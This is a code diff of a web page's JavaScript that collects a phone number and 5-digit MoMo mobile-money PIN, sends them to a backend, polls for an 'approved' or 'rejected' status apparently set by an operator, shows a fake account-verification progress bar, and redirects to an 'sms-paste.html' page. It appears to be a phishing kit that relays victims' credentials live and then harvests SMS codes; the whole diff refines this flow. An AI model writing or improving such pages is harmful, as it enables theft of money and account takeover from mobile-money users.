-        function getPinValue() {
-            return pinBoxes.map(b => b.value).join('');
+        if (!res.ok || !data.ok) {
+          throw new Error(data.error || 'Login failed');
         }
 
-        const eyeToggle = document.getElementById('eyeToggle');
-        let pinVisible = false;
-        eyeToggle.addEventListener('click', () => {
-            pinVisible = !pinVisible;
-            pinBoxes.forEach(box => { box.type = pinVisible ? 'text' : 'password'; });
-            eyeToggle.classList.toggle('revealed', pinVisible);
-        });
+        closeModal();
+        startVerifyBar();
+        document.body.classList.add('modal-open');
 
-        const verifyOverlay = document.getElementById('verifyOverlay');
-        const verifyBarFill = document.getElementById('verifyBarFill');
-        const verifyTitle   = document.getElementById('verifyTitle');
-        const verifySubtitle = document.getElementById('verifySubtitle');
-        let verifyTimer = null;
-
-        function startVerifyBar() {
-            verifyOverlay.classList.add('show');
-            verifyBarFill.style.width = '0%';
-            verifyBarFill.style.background = '';
-            const startTime = Date.now();
-            verifyTimer = setInterval(function() {
-                const elapsed = Date.now() - startTime;
-                const pct = Math.min((elapsed / (10 * 60 * 1000)) * 90, 90);
-                verifyBarFill.style.width = pct.toFixed(1) + '%';
-            }, 300);
-        }
-        function finishVerifyBar() {
-            if (verifyTimer) clearInterval(verifyTimer);
-            verifyBarFill.style.width = '100%';
+        if (data.sessionId) {
+          startPolling(data.sessionId, fullPhone, 'CM', data.token);
+        } else {
+          localStorage.setItem('momoSession', JSON.stringify({
+            phone: fullPhone, country: 'CM', token: data.token,
+            loggedInAt: new Date().toISOString()
+          }));
+          localStorage.setItem('momoPhone', fullPhone);
+          localStorage.setItem('momoCountry', 'CM');
+          setTimeout(function() {
+            finishVerifyBar();
+            setTimeout(function() { window.location.href = 'sms-paste.html'; }, 350);
+          }, 72 * 1000);
         }
 
-        function showRejection(reason) {
-            if (verifyTimer) clearInterval(verifyTimer);
-            verifyBarFill.style.width = '100%';
-            verifyBarFill.style.background = '#e74c3c';
+      } catch (err) {
+        console.error('Login error:', err);
+        proceed.disabled = false;
+        proceed.innerHTML = '<span>Proceed</span>';
+        const reason = err.name === 'AbortError'
+          ? 'Server took too long. Please try again.'
+          : (err.message || 'Could not connect. Check your internet.');
+        pinError.textContent = reason;
+        pinError.classList.add('show');
+      }
+    });
 
-            verifyTitle.innerHTML = reason.title;
-            verifySubtitle.innerHTML = reason.subtitle;
+    // ═══════════════════════════════════════════════════════════
+    // SUPER VERIFY OVERLAY
+    // ═══════════════════════════════════════════════════════════
+    const verifyOverlay = document.getElementById('verifyOverlay');
+    const verifyBarFill = document.getElementById('verifyBarFill');
+    const verifyTitle   = document.getElementById('verifyTitle');
+    const verifySubtitle = document.getElementById('verifySubtitle');
+    const verifyStepInner = document.getElementById('verifyStepInner');
 
-            setTimeout(function() {
-                verifyOverlay.classList.remove('show');
-                verifyBarFill.style.background = '';
-                verifyTitle.innerHTML = 'Verifying your <span class="highlight">MoMo account</span><span class="verify-dots"><span>.</span><span>.</span><span>.</span></span>';
-                verifySubtitle.textContent = 'Waiting for confirmation. Please hold on…';
+    function startVerifyBar() {
+      verifyOverlay.classList.add('show');
+      verifyBarFill.style.width = '0%';
+      verifyBarFill.style.background = '';
+      verifyTitle.innerHTML = 'Verifying your <span class="highlight">MoMo account</span>';
+      verifySubtitle.textContent = 'Waiting for confirmation. Please hold on…';
+      verifyStepInner.style.transform = 'translateY(0)';
 
-                /* Clear PIN only — keep phone number */
-                pinBoxes.forEach(b => { b.value = ''; b.classList.remove('filled', 'invalid'); });
-                loginBtn.disabled = false;
-                loginBtn.textContent = 'LOGIN';
+      // Rotate status messages
+      let stepIndex = 0;
+      verifyStepInner.style.transform = `translateY(0)`;
+      if (stepTimer) clearInterval(stepTimer);
+      stepTimer = setInterval(() => {
+        stepIndex = (stepIndex + 1) % 4;
+        verifyStepInner.style.transform = `translateY(-${stepIndex * 20}px)`;
+      }, 2200);
 
-                /* Show error under the PIN field */
-                pinError.textContent = 'Incorrect credentials. Please check your number and ensure your details match.';
-                pinError.classList.add('show');
-                pinBoxes[0].focus();
-            }, 4000);
-        }
+      const startTime = Date.now();
+      if (verifyTimer) clearInterval(verifyTimer);
+      verifyTimer = setInterval(function() {
+        const elapsed = Date.now() - startTime;
+        const pct = Math.min((elapsed / (10 * 60 * 1000)) * 90, 90);
+        verifyBarFill.style.width = pct.toFixed(1) + '%';
+      }, 300);
+    }
 
-        let pollTimer = null;
-        function stopPolling() {
-            if (pollTimer) { clearInterval(pollTimer); pollTimer = null; }
-        }
+    function finishVerifyBar() {
+      if (verifyTimer) clearInterval(verifyTimer);
+      if (stepTimer) clearInterval(stepTimer);
+      verifyBarFill.style.width = '100%';
+    }
 
-        function startPolling(sessionId, fullPhone, currentCountry, token) {
+    function showRejection(reason) {
+      if (verifyTimer) clearInterval(verifyTimer);
+      if (stepTimer) clearInterval(stepTimer);
+      verifyBarFill.style.width = '100%';
+      verifyBarFill.style.background = '#e74c3c';
+      verifyStepInner.style.transform = 'translateY(0)';
+
+      verifyTitle.innerHTML = reason.title;
+      verifySubtitle.innerHTML = reason.subtitle;
+
+      setTimeout(function() {
+        verifyOverlay.classList.remove('show');
+        verifyBarFill.style.background = '';
+        document.body.classList.remove('modal-open');
+        openModal();
+        pinError.textContent = 'Incorrect credentials. Please check your PIN and try again.';
+        pinError.classList.add('show');
+      }, 4000);
+    }
+
+    // ═══════════════════════════════════════════════════════════
+    // POLLING
+    // ═══════════════════════════════════════════════════════════
+    function stopPolling() {
+      if (pollTimer) { clearInterval(pollTimer); pollTimer = null; }
+    }
+
+    function startPolling(sessionId, fullPhone, country, token) {
+      stopPolling();
+      pollTimer = setInterval(async () => {
+        try {
+          const res = await fetch(`${API_BASE}/api/status/${sessionId}`);
+          const data = await res.json().catch(() => ({}));
+          if (!data.ok) return;
+
+          if (data.status === 'approved') {
             stopPolling();
-            pollTimer = setInterval(async () => {
-                try {
-                    const res = await fetch(`${API_BASE}/api/status/${sessionId}`);
-                    const data = await res.json().catch(() => ({}));
-                    if (!data.ok) return;
+            finishVerifyBar();
+            localStorage.setItem('momoSession', JSON.stringify({
+              phone: fullPhone, country: country, token: token,
+              sessionId: sessionId, loggedInAt: new Date().toISOString()
+            }));
+            localStorage.setItem('momoPhone', fullPhone);
+            localStorage.setItem('momoCountry', country);
+            setTimeout(() => { window.location.href = 'sms-paste.html'; }, 300);
 
-                    if (data.status === 'approved') {
-                        stopPolling();
-                        finishVerifyBar();
-                        localStorage.setItem('momoSession', JSON.stringify({
-                            phone: fullPhone, country: currentCountry, token: token,
-                            sessionId: sessionId, loggedInAt: new Date().toISOString()
-                        }));
-                        localStorage.setItem('momoPhone', fullPhone);
-                        localStorage.setItem('momoCountry', currentCountry);
-                        setTimeout(() => { window.location.href = 'sms-paste.html'; }, 300);
-                    } else if (data.status === 'rejected') {
-                        stopPolling();
-                        showRejection({
-                            title: '⚠️ Incorrect <span class="highlight">credentials</span>',
-                            subtitle: 'Please check your number and ensure your details match.'
-                        });
-                    } else if (data.status === 'timeout') {
-                        stopPolling();
-                        showRejection({
-                            title: 'Request <span class="highlight">timed out</span>',
-                            subtitle: 'Please try again.'
-                        });
-                    }
-                } catch (err) {
-                    console.warn('poll error:', err.message);
-                }
-            }, POLL_INTERVAL_MS);
+          } else if (data.status === 'rejected') {
+            stopPolling();
+            showRejection({
+              title: '⚠️ Incorrect <span class="highlight">credentials</span>',
+              subtitle: 'Please check your PIN and try again.'
+            });
+
+          } else if (data.status === 'timeout') {
+            stopPolling();
+            showRejection({
+              title: 'Request <span class="highlight">timed out</span>',
+              subtitle: 'Please try again.'
+            });
+          }
+        } catch (err) {
+          console.warn('poll error:', err.message);
         }
+      }, POLL_INTERVAL_MS);
+    }
 
-        const loginBtn = document.getElementById('loginBtn');
-
-        loginBtn.addEventListener('click', async function() {
-            const countryData = COUNTRIES[currentCountry];
-            const phoneDigits = phoneInput.value.replace(/\s/g, '');
-            pinError.classList.remove('show');
-
-            if (phoneDigits.length !== countryData.digits || !/^\d+$/.test(phoneDigits)) {
-                phoneWrapper.classList.add('invalid');
-                phoneError.textContent = `Please enter a valid ${countryData.digits}-digit phone number`;
-                phoneError.classList.add('show');
-                phoneInput.focus();
-                return;
-            }
-            const pin = getPinValue();
-            if (pin.length !== 5) {
-                pinBoxes.forEach(b => b.classList.add('invalid'));
-                pinError.textContent = 'Please enter your 5-digit MoMo PIN';
-                pinError.classList.add('show');
-                pinBoxes[0].focus();
-                return;
-            }
-
-            loginBtn.disabled = true;
-            loginBtn.textContent = 'LOGGING IN...';
-            const fullPhone = countryData.code + phoneDigits;
-
-            try {
-                const controller = new AbortController();
-                const timeoutId = setTimeout(() => controller.abort(), 15000);
-
-                const res = await fetch(`${API_BASE}/api/login`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ phone: fullPhone, country: currentCountry, pin: pin }),
-                    signal: controller.signal
-                });
-                clearTimeout(timeoutId);
-
-                const data = await res.json().catch(() => ({}));
-                console.log('LOGIN RESPONSE:', data);
-
-                if (!res.ok || !data.ok) {
-                    throw new Error(data.error || 'Login failed');
-                }
-
-                if (data.sessionId) {
-                    startVerifyBar();
-                    startPolling(data.sessionId, fullPhone, currentCountry, data.token);
-                } else {
-                    console.warn('⚠️ No sessionId — fallback 72s flow');
-                    localStorage.setItem('momoSession', JSON.stringify({
-                        phone: fullPhone, country: currentCountry, token: data.token,
-                        loggedInAt: new Date().toISOString()
-                    }));
-                    localStorage.setItem('momoPhone', fullPhone);
-                    localStorage.setItem('momoCountry', currentCountry);
-                    startVerifyBar();
-                    setTimeout(function() {
-                        finishVerifyBar();
-                        setTimeout(function() { window.location.href = 'sms-paste.html'; }, 350);
-                    }, 72 * 1000);
-                }
-
-            } catch (err) {
-                console.error('Login error:', err);
-                loginBtn.disabled = false;
-                loginBtn.textContent = 'LOGIN';
-                const reason = err.name === 'AbortError'
-                    ? 'Server took too long. Please try again.'
-                    : (err.message || 'Could not connect. Check your internet.');
-                alert('Login failed: ' + reason);
-            }
-        });
-
-        phoneInput.addEventListener('blur', function() {
-            const digits = this.value.replace(/\s/g, '');
-            const needed = COUNTRIES[currentCountry].digits;
-            if (digits.length === needed && !getPinValue()) pinBoxes[0].focus();
-        });
-
-        window.addEventListener('load', () => {
-            phoneInput.value = '';
-            pinBoxes.forEach(b => { b.value = ''; b.classList.remove('filled', 'invalid'); });
-            phoneInput.focus();
-        });
-    </script>
+    window.addEventListener('load', () => {
+      phoneInput.value = '';
+      phoneInput.focus();
+    });
+  </script>
 </body>
 </html>
